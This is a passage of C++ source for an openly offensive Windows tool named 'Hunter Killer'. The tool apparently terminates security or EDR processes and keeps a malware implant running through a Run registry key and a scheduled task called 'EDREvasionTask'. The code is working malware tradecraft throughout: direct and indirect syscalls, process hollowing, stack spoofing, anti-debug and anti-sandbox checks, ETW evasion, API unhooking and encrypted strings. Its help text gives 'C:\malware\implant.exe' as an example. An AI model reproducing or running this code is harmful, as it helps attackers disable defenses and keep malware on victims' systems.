        if (RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
                           0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) != ERROR_SUCCESS) {
            return false;
        }

        if (RegSetValueExW(hKey, valueName, 0, REG_SZ, (const BYTE*)executablePath, 
                          (wcslen(executablePath) + 1) * sizeof(wchar_t)) != ERROR_SUCCESS) {
            RegCloseKey(hKey);
            return false;
        }

        RegCloseKey(hKey);
        return true;
    }

public:
    bool establish_persistence(const wchar_t* persistenceName, const wchar_t* executablePath) {
        bool taskSuccess = install_scheduled_task(persistenceName, executablePath);
        bool regSuccess = install_registry_run(persistenceName, executablePath);
        return taskSuccess || regSuccess;
    }
};

// ==================== PROCESS UTILITIES ====================
class ProcessUtils {
private:
    SyscallHandler syscalls;
    StackSpoofer spoofer;

    DWORD find_pid_by_name(const std::string& target) {
        spoofer.spoof();

        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnapshot == INVALID_HANDLE_VALUE)
            return 0;

        PROCESSENTRY32 pe;
        pe.dwSize = sizeof(PROCESSENTRY32);

        if (!Process32First(hSnapshot, &pe)) {
            CloseHandle(hSnapshot);
            return 0;
        }

        do {
            if (_stricmp(pe.szExeFile, target.c_str()) == 0) {
                CloseHandle(hSnapshot);
                return pe.th32ProcessID;
            }
        } while (Process32Next(hSnapshot, &pe));

        CloseHandle(hSnapshot);
        return 0;
    }

    DWORD find_pid_by_window(const std::string& window_title) {
        spoofer.spoof();

        HWND hwnd = FindWindowA(NULL, window_title.c_str());
        if (!hwnd)
            return 0;

        DWORD pid = 0;
        GetWindowThreadProcessId(hwnd, &pid);
        return pid;
    }

public:
    DWORD find_process(const std::string& target) {
        spoofer.spoof();
        char* endptr;
        DWORD pid = strtoul(target.c_str(), &endptr, 10);
        if (*endptr == '\0') {
            return pid;
        }

        pid = find_pid_by_name(target);
        if (pid != 0) {
            return pid;
        }

        return find_pid_by_window(target);
    }

    bool terminate_process(DWORD pid, bool stealth_mode) {
        spoofer.spoof();

        HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
        if (!hProcess)
            return false;

        bool success = false;
        
        if (TerminateProcess(hProcess, 0)) {
            success = true;
        }
        else if (syscalls.direct_syscall("NtTerminateProcess", hProcess, 0) == STATUS_SUCCESS) {
            success = true;
        }
        else if (syscalls.indirect_syscall("NtTerminateProcess", hProcess, 0) == STATUS_SUCCESS) {
            success = true;
        }
        else {
            std::vector<BYTE> exit_payload = { 0xB8, 0x00, 0x00, 0x00, 0x00, 0xC3 }; // mov eax, 0; ret
            ProcessHollowing hollow;
            if (hollow.execute(L"C:\\Windows\\System32\\notepad.exe", exit_payload)) {
                success = true;
            }
        }

        CloseHandle(hProcess);

        if (success && !stealth_mode) {
            AdvancedEncryptedString successMsg("Successfully terminated process with PID: ");
            printf("%s%lu\n", successMsg.decrypt(), pid);
        }

        return success;
    }
};


bool is_running_in_wine() {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (ntdll) {
        return GetProcAddress(ntdll, "wine_get_version") != nullptr;
    }
    return false;
}

void print_ascii_art() {

    UINT originalCP = GetConsoleOutputCP();
    BOOL utf8Success = SetConsoleOutputCP(CP_UTF8);

    const char* unicodeArt = R"(
 _   _             _              _    _ _ _           
| | | |           | |            | |  (_) | |          
| |_| |_   _ _ __ | |_ ___ _ __  | | ___| | | ___ _ __ 
|  _  | | | | '_ \| __/ _ \ '__| | |/ / | | |/ _ \ '__|
| | | | |_| | | | | ||  __/ |    |   <| | | |  __/ |   
\_| |_/\__,_|_| |_|\__\___|_|    |_|\_\_|_|_|\___|_|   
                                                       
)";

    AdvancedEncryptedString asciiArt(unicodeArt);
    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
    std::string decrypted = asciiArt.decrypt();
    DWORD written;
    BOOL success = WriteConsoleA(hConsole, decrypted.c_str(), decrypted.length(), &written, NULL);

  
    if (!success || written != decrypted.length()) {
        printf("%s\n");
    } else {
        printf("\n"); 
    }


    if (utf8Success) {
        SetConsoleOutputCP(originalCP);
    }
}
void print_help() {
    print_ascii_art();
    AdvancedEncryptedString helpText(R"(
Usage:
  hunter.exe <PID|ProcessName>
    - Terminate a process by PID or name

  hunter.exe --persist "C:\path\to\implant.exe"
    - Establish persistence for the specified executable

  hunter.exe --stealth <PID|ProcessName>
    - Terminate a process in stealth mode (no logging)

  hunter.exe --help
    - Display this help message

Examples:
  hunter.exe 1234
  hunter.exe notepad.exe
  hunter.exe --persist "C:\malware\implant.exe"
  hunter.exe --stealth 5678)");
    printf("%s\n", helpText.decrypt());
}

// ==================== MAIN FUNCTION ====================
int main(int argc, char* argv[]) {
    AntiDebug anti_debug;
    AntiSandbox anti_sandbox;
    ETWEvasion etw_evasion;
    APIUnhooker api_unhooker;
    StackSpoofer stack_spoofer;
    PersistenceManager persistence;

    if (anti_debug.is_debugger_present()) {
        anti_debug.evade_debugging();
        return 1;
    }

    if (anti_sandbox.is_sandbox_detected()) {
        anti_sandbox.evade_sandbox();
        return 1;
    }

    if (argc < 2) {
        print_help();
        return 1;
    }

    bool persist = false;
    bool stealth = false;
    std::string target;
    std::string persist_path;

    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--persist") == 0 && i + 1 < argc) {
            persist = true;
            persist_path = argv[++i];
        } else if (strcmp(argv[i], "--stealth") == 0 && i + 1 < argc) {
            stealth = true;
            target = argv[++i];
        } else if (strcmp(argv[i], "--help") == 0) {
            print_help();
            return 0;
        } else {
            target = argv[i];
        }
    }

    print_ascii_art();

    if (persist) {
        std::wstring wPersistPath(persist_path.begin(), persist_path.end());
        AdvancedEncryptedString taskName("EDREvasionTask");
        std::string taskNameStr = taskName.decrypt();
        std::wstring wTaskName(taskNameStr.begin(), taskNameStr.end());
        if (persistence.establish_persistence(wTaskName.c_str(), wPersistPath.c_str())) {
            AdvancedEncryptedString successMsg("Persistence established successfully");
            printf("%s\n", successMsg.decrypt());
        } else {
            AdvancedEncryptedString errorMsg("Failed to establish persistence");
            printf("%s\n", errorMsg.decrypt());
        }
        return 0;
    }

    ProcessUtils utils;
    DWORD pid = utils.find_process(target);
    if (pid == 0) {
        AdvancedEncryptedString errorMsg("Process not found");
        printf("%s\n", errorMsg.decrypt());
        return 1;
    }

    if (utils.terminate_process(pid, stealth)) {
        if (!stealth) {
            AdvancedEncryptedString successMsg("Successfully terminated process with PID: ");
            printf("%s%lu\n", successMsg.decrypt(), pid);
        }
        return 0;
    }

    AdvancedEncryptedString errorMsg("Failed to terminate process with PID: ");
    printf("%s%lu\n", errorMsg.decrypt(), pid);
    return 1;
}
